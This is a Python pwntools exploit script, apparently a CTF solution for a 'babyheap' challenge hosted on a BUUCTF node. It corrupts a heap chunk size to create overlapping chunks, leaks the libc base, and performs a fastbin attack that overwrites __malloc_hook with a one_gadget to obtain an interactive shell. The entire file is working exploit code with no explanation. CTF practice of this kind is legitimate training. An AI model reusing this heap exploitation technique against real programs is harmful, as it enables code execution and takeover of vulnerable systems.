#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='babyheap'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',29502)
			elf=ELF(elfelf)
			libc=ELF('../../x64libc/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4526a,0xf0364,0xf1207]


		def add(a,b):
			io.sendlineafter('>> ','1')
			sleep(0.1)
			io.sendline(str(a))
			sleep(0.1)
			io.send(b)

		def edit(a,c,b):
			io.sendlineafter('>> ','2')
			sleep(0.1)
			io.sendline(str(a))
			sleep(0.1)
			io.sendline(str(c))
			sleep(0.1)
			io.send(b)
		def show(a):
			io.sendlineafter('>> ','3')
			sleep(0.1)
			io.sendline(str(a))

		def delete(a):
			io.sendlineafter('>> ','4')
			sleep(0.1)
			io.sendline(str(a))

		add(0x68,'a'*0x68)
		add(0x88,'a'*0x88)
		add(0x68,'a'*0x68)
		add(0x68,'a'*0x68)
		edit(0,0x70,'a'*0x68+p64(0X101))
		delete(1)
		add(0x88,'a'*0x88)
		show(2)
		
		
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']

		delete(1)
		delete(2)
		add(0xf8,'a'*0x88+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23)+'a'*0x60)
		add(0x68,'\x00'*0x68)
		add(0x59,('\x00'*0x13+p64(libc_base+one_gadgaet[1])).ljust(0x59,'\x00'))
		# delete(3)
		
		success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue